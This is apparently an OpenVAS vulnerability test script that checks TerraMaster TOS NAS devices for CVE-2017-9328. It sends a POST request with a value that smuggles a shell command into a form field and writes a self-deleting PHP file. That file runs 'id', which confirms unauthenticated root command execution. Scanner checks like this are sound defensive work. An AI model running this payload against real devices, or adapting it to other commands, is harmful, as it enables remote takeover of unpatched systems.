##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_terramaster_tos_rce_vuln.nasl 11501 2018-09-20 12:19:13Z mmartin $
#
# TerraMaster TOS RCE Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:noontec:terramaster";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140376");
  script_version("$Revision: 11501 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-20 14:19:13 +0200 (Thu, 20 Sep 2018) $");
  script_tag(name:"creation_date", value:"2017-09-19 12:13:21 +0700 (Tue, 19 Sep 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2017-9328");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("TerraMaster TOS RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_terramaster_nas_detect.nasl");
  script_mandatory_keys("terramaster_nas/detected");

  script_tag(name:"summary", value:"TerraMaster TOS is prone to a remote command execution vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request to upload a php file and checks if
  the 'id' command could be executed.");

  script_tag(name:"insight", value:"Shell metacharacter injection vulnerability in
  /usr/www/include/ajax/GetTest.php in TerraMaster TOS leads to remote code execution as root.");

  script_tag(name:"impact", value:"An unauthenticated attacker may execute arbitrary code as root.");

  script_tag(name:"affected", value:"TerraMaster TOS prior to version 3.0.34.");

  script_tag(name:"solution", value:"Update to version 3.0.34 or later.");

  script_xref(name:"URL", value:"https://gist.github.com/hybriz/63bbe2d963e531357aca353c74dd1ad5");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

# <?php passthru("id"); unlink(__FILE__); ?>
data = 'dev=b1bebe&testtype=start;\\"$(echo -en "' +
        "\\x3c\\x3f\\x70\\x68\\x70\\x20\\x70\\x61\\x73\\x73\\x74\\x68\\x72\\x75\\x28\\x22\\x69\\x64\\x22\\x29\\x3b\\x20\\x75\\x6e\\x6c\\x69\\x6e\\x6b\\x28\\x5f\\x5f\\x46\\x49\\x4c\\x45\\x5f\\x5f\\x29\\x3b\\x20\\x3f\\x3e\\n" +
        '" > vt-test_cve_2017_9328.php);';

url = '/include/ajax/GetTest.php';

req = http_post_req(port: port, url: url, data: data,
                    add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
res = http_keepalive_send_recv(port: port, data: req);

if ("Call to undefined function" >< res) {
  url = '/include/ajax/vt-test_cve_2017_9328.php';
  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (res =~ 'uid=[0-9]+.*gid=[0-9]+') {
    report = "It was possible to execute the 'id' command.\n\nResult:\n" + res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
